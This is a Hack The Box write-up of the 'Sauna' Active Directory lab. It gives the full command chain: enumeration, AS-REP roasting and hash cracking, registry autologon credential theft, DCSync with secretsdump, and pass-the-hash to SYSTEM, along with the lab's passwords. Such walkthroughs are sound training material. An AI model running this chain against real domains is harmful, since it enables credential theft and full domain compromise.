# Sauna — Hack The Box

| | |
|---|---|
| **Platform** | Hack The Box |
| **OS** | Windows |
| **Difficulty** | Easy |
| **Domain** | `egotistical-bank.local` |

## Synopsis

Sauna is an easy Windows **Active Directory** machine. The company website lists employee
names, from which a username list is built using common AD naming conventions. One of those
accounts, `fsmith`, has **"Do not require Kerberos pre-authentication"** set, enabling
**AS-REP Roasting**; the hash cracks offline and grants WinRM access. On the box, WinPEAS
finds **autologon credentials** in the registry for the `svc_loanmgr` account, which holds
**DCSync** rights (`GetChanges`/`GetChangesAll`). DCSync dumps the Administrator NT hash for a
**Pass-the-Hash** login as Domain Admin.

---

## Enumeration

### Nmap

```bash
nmap -p- --min-rate=5000 -T4 <target>
nmap -p53,80,88,135,139,389,445,464,593,636,3268,5985 -sCV <target>
```

A Domain Controller with a web server on 80. Add `egotistical-bank.local` to `/etc/hosts`.

### Building a username list

The site's **"Meet the team"** page lists full names (e.g. *Fergus Smith*, *Hugo Bear*, *Steven
Kerb* ...). Generate candidate usernames with common conventions (`fsmith`, `fergus.smith`,
`smithf`, ...):

```bash
# e.g. with username-anarchy
./username-anarchy -i names.txt > users.txt
```

---

## Foothold — AS-REP Roasting

Request AS-REPs for the candidate users; `fsmith` has pre-auth disabled:

```bash
GetNPUsers.py egotistical-bank.local/ -usersfile users.txt -no-pass -dc-ip <target>
# $krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:...
```

Crack it:

```bash
hashcat -m 18200 fsmith.asrep /usr/share/wordlists/rockyou.txt
# fsmith : Thestrokes23
```

Log in over WinRM:

```bash
evil-winrm -i <target> -u fsmith -p 'Thestrokes23'
```

The **user flag** is in `C:\Users\FSmith\Desktop\user.txt`.

---

## Privilege Escalation

### Autologon credentials

Running WinPEAS (or querying the registry directly) reveals **autologon** credentials stored
in cleartext:

```powershell
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
# DefaultUserName   : EGOTISTICALBANK\svc_loanmanager
# DefaultPassword   : Moneymakestheworldgoround!
```

The real account name is `svc_loanmgr`:

```bash
evil-winrm -i <target> -u svc_loanmgr -p 'Moneymakestheworldgoround!'
```

### DCSync → Administrator

BloodHound (or `secretsdump`) shows `svc_loanmgr` has **GetChanges / GetChangesAll** on the
domain — i.e. **DCSync** rights:

```bash
secretsdump.py egotistical-bank.local/svc_loanmgr:'Moneymakestheworldgoround!'@<target> \
  -just-dc-user Administrator
# Administrator:500:aad3b...:<admin-nt-hash>:::
```

Pass-the-Hash as Administrator:

```bash
psexec.py egotistical-bank.local/Administrator@<target> -hashes :<admin-nt-hash>
# or: evil-winrm -i <target> -u Administrator -H <admin-nt-hash>
```

```
C:\> whoami
nt authority\system
```

The **root flag** is in `C:\Users\Administrator\Desktop\root.txt`.
